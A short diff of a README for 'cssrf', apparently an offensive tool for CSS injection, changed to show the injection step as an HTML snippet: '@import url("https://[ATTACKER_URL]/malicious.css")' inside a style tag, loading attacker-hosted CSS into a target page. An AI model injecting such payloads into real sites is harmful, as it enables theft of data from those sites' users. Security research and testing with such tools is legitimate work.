@@ -17,7 +17,13 @@ All you need is **launch** `cssrf`:
 cssrf [flags] # nothing crazy => cssrf -h to get flags info
 ```
 
-**Inject** `https://[ATTACKER_URL]/malicious.css` and **wait**:
+**Inject**  the malicious css:
+```html
+<!-- in <style> tag -->
+@import url("https://[ATTACKER_URL]/malicious.css");
+```
+
+And **wait**:
 
 ![demo](https://github.com/ariary/cssrf/blob/main/cssrf.gif)
 
